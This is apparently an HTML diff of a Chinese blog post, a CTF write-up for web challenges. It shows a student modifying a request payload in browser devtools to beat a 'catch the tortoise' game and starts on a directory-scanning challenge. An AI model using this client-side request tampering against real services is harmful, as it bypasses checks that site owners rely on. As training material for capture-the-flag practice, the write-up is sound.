@@ -1,0 +1,1048 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>2025极客大挑战web（部分）WP | Lhz&#39;s blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="声明：第一次参加极客大挑战CTF比赛，web方向总共解决了六道题目（6/20），我是菜鸟🫠
+阿基里斯追乌龟
+#JavaScript
+题目描述：在古希腊，英雄阿基里斯和一只乌龟赛跑。阿基里斯的速度是乌龟的十倍。比赛开始时，乌龟在阿基里斯前面100米。芝诺悖论认为，当阿基里斯追到乌龟的出发点时，乌龟已经又向前爬了一段距离。当阿基里斯再追到那个位置时，乌龟又向前爬了。如此无限循环，阿基里斯似乎永远也追不上乌龟。他真的追不上吗？
+大概查看网页信息，只要让阿基里斯的位置比乌龟的位置远即可得到 flag，但是根据题目的 JavaScript 代码，不可能一直点击追赶按键，其实只要用浏览器进行前端调试即可
+...
+const payload = { 
+    achilles_distance: achillesPos,
+    tortoise_distance: tortoisePos,
+};
+fetch(&#39;/chase&#39;, {             // 在这里打断点，在 fetch 发起请求前修改 Payload 对象
+    method: &#39;POST&#39;,           // 使 achillesPos &gt; tortoisePos
+    headers: {
+        &#39;Content-Type&#39;: &#39;application/json&#39;,
+    },
+    body: JSON.stringify({ 
+        &#34;data&#34;: encryptData(payload) 
+    }),
+})
+...
+修改后继续执行脚本即可得到 flag，对代码感兴趣的可以去详细了解一下原理，下面附上源代码
+function encryptData(obj) {
+    const jsonString = JSON.stringify(obj);
+    return btoa(unescape(encodeURIComponent(jsonString)));
+}
+
+function decryptData(encodedString) {
+    const jsonString = decodeURIComponent(escape(atob(encodedString)));
+    return JSON.parse(jsonString);
+}
+
+document.addEventListener(&#39;DOMContentLoaded&#39;, () =&gt; {
+    const chaseBtn = document.getElementById(&#39;chase-btn&#39;);
+    const achillesDistanceSpan = document.getElementById(&#39;achilles-distance&#39;);
+    const tortoiseDistanceSpan = document.getElementById(&#39;tortoise-distance&#39;);
+    const resultDiv = document.getElementById(&#39;result&#39;);
+
+    let achillesPos = 0;
+    let tortoisePos = 10000000000; // Initial head start for the tortoise
+
+    achillesDistanceSpan.textContent = achillesPos.toFixed(2);
+    tortoiseDistanceSpan.textContent = tortoisePos.toFixed(2);
+
+    chaseBtn.addEventListener(&#39;click&#39;, () =&gt; {
+        // Achilles moves to the tortoise&#39;s current position
+        const achillesMoveDistance = tortoisePos - achillesPos;
+        achillesPos = tortoisePos;
+
+        // The tortoise moves 1/10th of the distance Achilles just covered
+        const tortoiseMoveDistance = achillesMoveDistance / 10;
+        tortoisePos &#43;= tortoiseMoveDistance;
+
+        achillesDistanceSpan.textContent = achillesPos.toFixed(2);
+        tortoiseDistanceSpan.textContent = tortoisePos.toFixed(2);
+
+        const payload = {
+            achilles_distance: achillesPos,
+            tortoise_distance: tortoisePos,
+        };
+
+        fetch(&#39;/chase&#39;, {
+            method: &#39;POST&#39;,
+            headers: {
+                &#39;Content-Type&#39;: &#39;application/json&#39;,
+            },
+            body: JSON.stringify({ &#34;data&#34;: encryptData(payload) }),
+        })
+        .then(response =&gt; response.json())
+        .then(encryptedResponse =&gt; {
+            if (encryptedResponse.data) {
+                const data = decryptData(encryptedResponse.data);
+                if (data.flag) {
+                    // Use &#39;pre-wrap&#39; to respect newlines in the fake flag message
+                    resultDiv.style.whiteSpace = &#39;pre-wrap&#39;;
+                    resultDiv.textContent = `你追上它了！\n${data.flag}`;
+                    chaseBtn.disabled = true;
+                } else if (data.message) {
+                    resultDiv.textContent = data.message;
+                }
+            } else {
+                console.error(&#39;Error:&#39;, encryptedResponse.error);
+                resultDiv.textContent = `发生错误: ${encryptedResponse.error}`;
+            }
+        })
+        .catch(error =&gt; {
+            console.error(&#39;Error:&#39;, error);
+            resultDiv.textContent = &#39;发生错误。&#39;;
+        });
+    });
+}); 
+Vibe SEO
+#目录扫描">
+<meta name="author" content="">
+<link rel="canonical" href="https://lhzzz08.github.io/posts/geekchallengewebwp/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://lhzzz08.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://lhzzz08.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://lhzzz08.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://lhzzz08.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://lhzzz08.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://lhzzz08.github.io/posts/geekchallengewebwp/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://lhzzz08.github.io/posts/geekchallengewebwp/">
+  <meta property="og:site_name" content="Lhz&#39;s blog">
+  <meta property="og:title" content="2025极客大挑战web（部分）WP">
+  <meta property="og:description" content="声明：第一次参加极客大挑战CTF比赛，web方向总共解决了六道题目（6/20），我是菜鸟🫠
+阿基里斯追乌龟 #JavaScript
+题目描述：在古希腊，英雄阿基里斯和一只乌龟赛跑。阿基里斯的速度是乌龟的十倍。比赛开始时，乌龟在阿基里斯前面100米。芝诺悖论认为，当阿基里斯追到乌龟的出发点时，乌龟已经又向前爬了一段距离。当阿基里斯再追到那个位置时，乌龟又向前爬了。如此无限循环，阿基里斯似乎永远也追不上乌龟。他真的追不上吗？
+大概查看网页信息，只要让阿基里斯的位置比乌龟的位置远即可得到 flag，但是根据题目的 JavaScript 代码，不可能一直点击追赶按键，其实只要用浏览器进行前端调试即可
+... const payload = { achilles_distance: achillesPos, tortoise_distance: tortoisePos, }; fetch(&#39;/chase&#39;, { // 在这里打断点，在 fetch 发起请求前修改 Payload 对象 method: &#39;POST&#39;, // 使 achillesPos &gt; tortoisePos headers: { &#39;Content-Type&#39;: &#39;application/json&#39;, }, body: JSON.stringify({ &#34;data&#34;: encryptData(payload) }), }) ... 修改后继续执行脚本即可得到 flag，对代码感兴趣的可以去详细了解一下原理，下面附上源代码
+function encryptData(obj) { const jsonString = JSON.stringify(obj); return btoa(unescape(encodeURIComponent(jsonString))); } function decryptData(encodedString) { const jsonString = decodeURIComponent(escape(atob(encodedString))); return JSON.parse(jsonString); } document.addEventListener(&#39;DOMContentLoaded&#39;, () =&gt; { const chaseBtn = document.getElementById(&#39;chase-btn&#39;); const achillesDistanceSpan = document.getElementById(&#39;achilles-distance&#39;); const tortoiseDistanceSpan = document.getElementById(&#39;tortoise-distance&#39;); const resultDiv = document.getElementById(&#39;result&#39;); let achillesPos = 0; let tortoisePos = 10000000000; // Initial head start for the tortoise achillesDistanceSpan.textContent = achillesPos.toFixed(2); tortoiseDistanceSpan.textContent = tortoisePos.toFixed(2); chaseBtn.addEventListener(&#39;click&#39;, () =&gt; { // Achilles moves to the tortoise&#39;s current position const achillesMoveDistance = tortoisePos - achillesPos; achillesPos = tortoisePos; // The tortoise moves 1/10th of the distance Achilles just covered const tortoiseMoveDistance = achillesMoveDistance / 10; tortoisePos &#43;= tortoiseMoveDistance; achillesDistanceSpan.textContent = achillesPos.toFixed(2); tortoiseDistanceSpan.textContent = tortoisePos.toFixed(2); const payload = { achilles_distance: achillesPos, tortoise_distance: tortoisePos, }; fetch(&#39;/chase&#39;, { method: &#39;POST&#39;, headers: { &#39;Content-Type&#39;: &#39;application/json&#39;, }, body: JSON.stringify({ &#34;data&#34;: encryptData(payload) }), }) .then(response =&gt; response.json()) .then(encryptedResponse =&gt; { if (encryptedResponse.data) { const data = decryptData(encryptedResponse.data); if (data.flag) { // Use &#39;pre-wrap&#39; to respect newlines in the fake flag message resultDiv.style.whiteSpace = &#39;pre-wrap&#39;; resultDiv.textContent = `你追上它了！\n${data.flag}`; chaseBtn.disabled = true; } else if (data.message) { resultDiv.textContent = data.message; } } else { console.error(&#39;Error:&#39;, encryptedResponse.error); resultDiv.textContent = `发生错误: ${encryptedResponse.error}`; } }) .catch(error =&gt; { console.error(&#39;Error:&#39;, error); resultDiv.textContent = &#39;发生错误。&#39;; }); }); }); Vibe SEO #目录扫描">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-11-24T21:04:46+08:00">
+    <meta property="article:modified_time" content="2025-11-24T21:04:46+08:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2025极客大挑战web（部分）WP">
+<meta name="twitter:description" content="声明：第一次参加极客大挑战CTF比赛，web方向总共解决了六道题目（6/20），我是菜鸟🫠
+阿基里斯追乌龟
+#JavaScript
+题目描述：在古希腊，英雄阿基里斯和一只乌龟赛跑。阿基里斯的速度是乌龟的十倍。比赛开始时，乌龟在阿基里斯前面100米。芝诺悖论认为，当阿基里斯追到乌龟的出发点时，乌龟已经又向前爬了一段距离。当阿基里斯再追到那个位置时，乌龟又向前爬了。如此无限循环，阿基里斯似乎永远也追不上乌龟。他真的追不上吗？
+大概查看网页信息，只要让阿基里斯的位置比乌龟的位置远即可得到 flag，但是根据题目的 JavaScript 代码，不可能一直点击追赶按键，其实只要用浏览器进行前端调试即可
+...
+const payload = { 
+    achilles_distance: achillesPos,
+    tortoise_distance: tortoisePos,
+};
+fetch(&#39;/chase&#39;, {             // 在这里打断点，在 fetch 发起请求前修改 Payload 对象
+    method: &#39;POST&#39;,           // 使 achillesPos &gt; tortoisePos
+    headers: {
+        &#39;Content-Type&#39;: &#39;application/json&#39;,
+    },
+    body: JSON.stringify({ 
+        &#34;data&#34;: encryptData(payload) 
+    }),
+})
+...
+修改后继续执行脚本即可得到 flag，对代码感兴趣的可以去详细了解一下原理，下面附上源代码
+function encryptData(obj) {
+    const jsonString = JSON.stringify(obj);
+    return btoa(unescape(encodeURIComponent(jsonString)));
+}
+
+function decryptData(encodedString) {
+    const jsonString = decodeURIComponent(escape(atob(encodedString)));
+    return JSON.parse(jsonString);
+}
+
+document.addEventListener(&#39;DOMContentLoaded&#39;, () =&gt; {
+    const chaseBtn = document.getElementById(&#39;chase-btn&#39;);
+    const achillesDistanceSpan = document.getElementById(&#39;achilles-distance&#39;);
+    const tortoiseDistanceSpan = document.getElementById(&#39;tortoise-distance&#39;);
+    const resultDiv = document.getElementById(&#39;result&#39;);
+
+    let achillesPos = 0;
+    let tortoisePos = 10000000000; // Initial head start for the tortoise
+
+    achillesDistanceSpan.textContent = achillesPos.toFixed(2);
+    tortoiseDistanceSpan.textContent = tortoisePos.toFixed(2);
+
+    chaseBtn.addEventListener(&#39;click&#39;, () =&gt; {
+        // Achilles moves to the tortoise&#39;s current position
+        const achillesMoveDistance = tortoisePos - achillesPos;
+        achillesPos = tortoisePos;
+
+        // The tortoise moves 1/10th of the distance Achilles just covered
+        const tortoiseMoveDistance = achillesMoveDistance / 10;
+        tortoisePos &#43;= tortoiseMoveDistance;
+
+        achillesDistanceSpan.textContent = achillesPos.toFixed(2);
+        tortoiseDistanceSpan.textContent = tortoisePos.toFixed(2);
+
+        const payload = {
+            achilles_distance: achillesPos,
+            tortoise_distance: tortoisePos,
+        };
+
+        fetch(&#39;/chase&#39;, {
+            method: &#39;POST&#39;,
+            headers: {
+                &#39;Content-Type&#39;: &#39;application/json&#39;,
+            },
+            body: JSON.stringify({ &#34;data&#34;: encryptData(payload) }),
+        })
+        .then(response =&gt; response.json())
+        .then(encryptedResponse =&gt; {
+            if (encryptedResponse.data) {
+                const data = decryptData(encryptedResponse.data);
+                if (data.flag) {
+                    // Use &#39;pre-wrap&#39; to respect newlines in the fake flag message
+                    resultDiv.style.whiteSpace = &#39;pre-wrap&#39;;
+                    resultDiv.textContent = `你追上它了！\n${data.flag}`;
+                    chaseBtn.disabled = true;
+                } else if (data.message) {
+                    resultDiv.textContent = data.message;
+                }
+            } else {
+                console.error(&#39;Error:&#39;, encryptedResponse.error);
+                resultDiv.textContent = `发生错误: ${encryptedResponse.error}`;
+            }
+        })
+        .catch(error =&gt; {
+            console.error(&#39;Error:&#39;, error);
+            resultDiv.textContent = &#39;发生错误。&#39;;
+        });
+    });
+}); 
+Vibe SEO
+#目录扫描">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://lhzzz08.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "2025极客大挑战web（部分）WP",
+      "item": "https://lhzzz08.github.io/posts/geekchallengewebwp/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "2025极客大挑战web（部分）WP",
+  "name": "2025极客大挑战web（部分）WP",
+  "description": "声明：第一次参加极客大挑战CTF比赛，web方向总共解决了六道题目（6/20），我是菜鸟🫠\n阿基里斯追乌龟 #JavaScript\n题目描述：在古希腊，英雄阿基里斯和一只乌龟赛跑。阿基里斯的速度是乌龟的十倍。比赛开始时，乌龟在阿基里斯前面100米。芝诺悖论认为，当阿基里斯追到乌龟的出发点时，乌龟已经又向前爬了一段距离。当阿基里斯再追到那个位置时，乌龟又向前爬了。如此无限循环，阿基里斯似乎永远也追不上乌龟。他真的追不上吗？\n大概查看网页信息，只要让阿基里斯的位置比乌龟的位置远即可得到 flag，但是根据题目的 JavaScript 代码，不可能一直点击追赶按键，其实只要用浏览器进行前端调试即可\n... const payload = { achilles_distance: achillesPos, tortoise_distance: tortoisePos, }; fetch(\u0026#39;/chase\u0026#39;, { // 在这里打断点，在 fetch 发起请求前修改 Payload 对象 method: \u0026#39;POST\u0026#39;, // 使 achillesPos \u0026gt; tortoisePos headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39;, }, body: JSON.stringify({ \u0026#34;data\u0026#34;: encryptData(payload) }), }) ... 修改后继续执行脚本即可得到 flag，对代码感兴趣的可以去详细了解一下原理，下面附上源代码\nfunction encryptData(obj) { const jsonString = JSON.stringify(obj); return btoa(unescape(encodeURIComponent(jsonString))); } function decryptData(encodedString) { const jsonString = decodeURIComponent(escape(atob(encodedString))); return JSON.parse(jsonString); } document.addEventListener(\u0026#39;DOMContentLoaded\u0026#39;, () =\u0026gt; { const chaseBtn = document.getElementById(\u0026#39;chase-btn\u0026#39;); const achillesDistanceSpan = document.getElementById(\u0026#39;achilles-distance\u0026#39;); const tortoiseDistanceSpan = document.getElementById(\u0026#39;tortoise-distance\u0026#39;); const resultDiv = document.getElementById(\u0026#39;result\u0026#39;); let achillesPos = 0; let tortoisePos = 10000000000; // Initial head start for the tortoise achillesDistanceSpan.textContent = achillesPos.toFixed(2); tortoiseDistanceSpan.textContent = tortoisePos.toFixed(2); chaseBtn.addEventListener(\u0026#39;click\u0026#39;, () =\u0026gt; { // Achilles moves to the tortoise\u0026#39;s current position const achillesMoveDistance = tortoisePos - achillesPos; achillesPos = tortoisePos; // The tortoise moves 1/10th of the distance Achilles just covered const tortoiseMoveDistance = achillesMoveDistance / 10; tortoisePos += tortoiseMoveDistance; achillesDistanceSpan.textContent = achillesPos.toFixed(2); tortoiseDistanceSpan.textContent = tortoisePos.toFixed(2); const payload = { achilles_distance: achillesPos, tortoise_distance: tortoisePos, }; fetch(\u0026#39;/chase\u0026#39;, { method: \u0026#39;POST\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39;, }, body: JSON.stringify({ \u0026#34;data\u0026#34;: encryptData(payload) }), }) .then(response =\u0026gt; response.json()) .then(encryptedResponse =\u0026gt; { if (encryptedResponse.data) { const data = decryptData(encryptedResponse.data); if (data.flag) { // Use \u0026#39;pre-wrap\u0026#39; to respect newlines in the fake flag message resultDiv.style.whiteSpace = \u0026#39;pre-wrap\u0026#39;; resultDiv.textContent = `你追上它了！\\n${data.flag}`; chaseBtn.disabled = true; } else if (data.message) { resultDiv.textContent = data.message; } } else { console.error(\u0026#39;Error:\u0026#39;, encryptedResponse.error); resultDiv.textContent = `发生错误: ${encryptedResponse.error}`; } }) .catch(error =\u0026gt; { console.error(\u0026#39;Error:\u0026#39;, error); resultDiv.textContent = \u0026#39;发生错误。\u0026#39;; }); }); }); Vibe SEO #目录扫描\n",
+  "keywords": [
+    
+  ],
+  "articleBody": "声明：第一次参加极客大挑战CTF比赛，web方向总共解决了六道题目（6/20），我是菜鸟🫠\n阿基里斯追乌龟 #JavaScript\n题目描述：在古希腊，英雄阿基里斯和一只乌龟赛跑。阿基里斯的速度是乌龟的十倍。比赛开始时，乌龟在阿基里斯前面100米。芝诺悖论认为，当阿基里斯追到乌龟的出发点时，乌龟已经又向前爬了一段距离。当阿基里斯再追到那个位置时，乌龟又向前爬了。如此无限循环，阿基里斯似乎永远也追不上乌龟。他真的追不上吗？\n大概查看网页信息，只要让阿基里斯的位置比乌龟的位置远即可得到 flag，但是根据题目的 JavaScript 代码，不可能一直点击追赶按键，其实只要用浏览器进行前端调试即可\n... const payload = { achilles_distance: achillesPos, tortoise_distance: tortoisePos, }; fetch('/chase', { // 在这里打断点，在 fetch 发起请求前修改 Payload 对象 method: 'POST', // 使 achillesPos \u003e tortoisePos headers: { 'Content-Type': 'application/json', }, body: JSON.stringify({ \"data\": encryptData(payload) }), }) ... 修改后继续执行脚本即可得到 flag，对代码感兴趣的可以去详细了解一下原理，下面附上源代码\nfunction encryptData(obj) { const jsonString = JSON.stringify(obj); return btoa(unescape(encodeURIComponent(jsonString))); } function decryptData(encodedString) { const jsonString = decodeURIComponent(escape(atob(encodedString))); return JSON.parse(jsonString); } document.addEventListener('DOMContentLoaded', () =\u003e { const chaseBtn = document.getElementById('chase-btn'); const achillesDistanceSpan = document.getElementById('achilles-distance'); const tortoiseDistanceSpan = document.getElementById('tortoise-distance'); const resultDiv = document.getElementById('result'); let achillesPos = 0; let tortoisePos = 10000000000; // Initial head start for the tortoise achillesDistanceSpan.textContent = achillesPos.toFixed(2); tortoiseDistanceSpan.textContent = tortoisePos.toFixed(2); chaseBtn.addEventListener('click', () =\u003e { // Achilles moves to the tortoise's current position const achillesMoveDistance = tortoisePos - achillesPos; achillesPos = tortoisePos; // The tortoise moves 1/10th of the distance Achilles just covered const tortoiseMoveDistance = achillesMoveDistance / 10; tortoisePos += tortoiseMoveDistance; achillesDistanceSpan.textContent = achillesPos.toFixed(2); tortoiseDistanceSpan.textContent = tortoisePos.toFixed(2); const payload = { achilles_distance: achillesPos, tortoise_distance: tortoisePos, }; fetch('/chase', { method: 'POST', headers: { 'Content-Type': 'application/json', }, body: JSON.stringify({ \"data\": encryptData(payload) }), }) .then(response =\u003e response.json()) .then(encryptedResponse =\u003e { if (encryptedResponse.data) { const data = decryptData(encryptedResponse.data); if (data.flag) { // Use 'pre-wrap' to respect newlines in the fake flag message resultDiv.style.whiteSpace = 'pre-wrap'; resultDiv.textContent = `你追上它了！\\n${data.flag}`; chaseBtn.disabled = true; } else if (data.message) { resultDiv.textContent = data.message; } } else { console.error('Error:', encryptedResponse.error); resultDiv.textContent = `发生错误: ${encryptedResponse.error}`; } }) .catch(error =\u003e { console.error('Error:', error); resultDiv.textContent = '发生错误。'; }); }); }); Vibe SEO #目录扫描\n题目描述：“我让 AI 帮我做了搜索引擎优化，它好像说什么『搜索引擎喜欢结构化的站点地图』，虽然不是很懂就是了”\n网站首页什么信息都没有，但是根据题目描述中的信息，SEO (Search Engine Optimization)，就是搜索引擎优化，可以访问一些与之相关的文件目录，如：robots.txt，sitemap.xml 等，dirsearch 中也包含了这些常见目录，得到 /sitemap.xml\n",
+  "wordCount" : "1637",
+  "inLanguage": "en",
+  "datePublished": "2025-11-24T21:04:46+08:00",
+  "dateModified": "2025-11-24T21:04:46+08:00",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://lhzzz08.github.io/posts/geekchallengewebwp/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Lhz's blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://lhzzz08.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://lhzzz08.github.io/" accesskey="h" title="Lhz&#39;s blog (Alt + H)">Lhz&#39;s blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      2025极客大挑战web（部分）WP
+    </h1>
+    <div class="post-meta"><span title='2025-11-24 21:04:46 +0800 CST'>November 24, 2025</span>
+
+</div>
+  </header> 
+  <div class="post-content"><p><strong>声明</strong>：第一次参加极客大挑战CTF比赛，web方向总共解决了六道题目（6/20），我是菜鸟🫠</p>
+<h1 id="阿基里斯追乌龟">阿基里斯追乌龟<a hidden class="anchor" aria-hidden="true" href="#阿基里斯追乌龟">#</a></h1>
+<p>#JavaScript</p>
+<p>题目描述：在古希腊，英雄阿基里斯和一只乌龟赛跑。阿基里斯的速度是乌龟的十倍。比赛开始时，乌龟在阿基里斯前面100米。芝诺悖论认为，当阿基里斯追到乌龟的出发点时，乌龟已经又向前爬了一段距离。当阿基里斯再追到那个位置时，乌龟又向前爬了。如此无限循环，阿基里斯似乎永远也追不上乌龟。他真的追不上吗？</p>
+<p>大概查看网页信息，只要让阿基里斯的位置比乌龟的位置远即可得到 flag，但是根据题目的 JavaScript 代码，不可能一直点击<code>追赶</code>按键，其实<strong>只要用浏览器进行前端调试即可</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> { 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">achilles_distance</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">achillesPos</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">tortoise_distance</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">tortoisePos</span>,
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/chase&#39;</span>, {             <span style="color:#75715e">// 在这里打断点，在 fetch 发起请求前修改 Payload 对象
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>,           <span style="color:#75715e">// 使 achillesPos &gt; tortoisePos
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Content-Type&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;application/json&#39;</span>,
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({ 
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;data&#34;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">encryptData</span>(<span style="color:#a6e22e">payload</span>) 
+</span></span><span style="display:flex;"><span>    }),
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>修改后<strong>继续执行脚本</strong>即可得到 flag，对代码感兴趣的可以去详细了解一下原理，下面附上源代码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">encryptData</span>(<span style="color:#a6e22e">obj</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">jsonString</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">obj</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">unescape</span>(encodeURIComponent(<span style="color:#a6e22e">jsonString</span>)));
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">decryptData</span>(<span style="color:#a6e22e">encodedString</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">jsonString</span> <span style="color:#f92672">=</span> decodeURIComponent(<span style="color:#a6e22e">escape</span>(<span style="color:#a6e22e">atob</span>(<span style="color:#a6e22e">encodedString</span>)));
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">jsonString</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;DOMContentLoaded&#39;</span>, () =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">chaseBtn</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;chase-btn&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">achillesDistanceSpan</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;achilles-distance&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">tortoiseDistanceSpan</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;tortoise-distance&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">resultDiv</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;result&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">achillesPos</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">tortoisePos</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">10000000000</span>; <span style="color:#75715e">// Initial head start for the tortoise
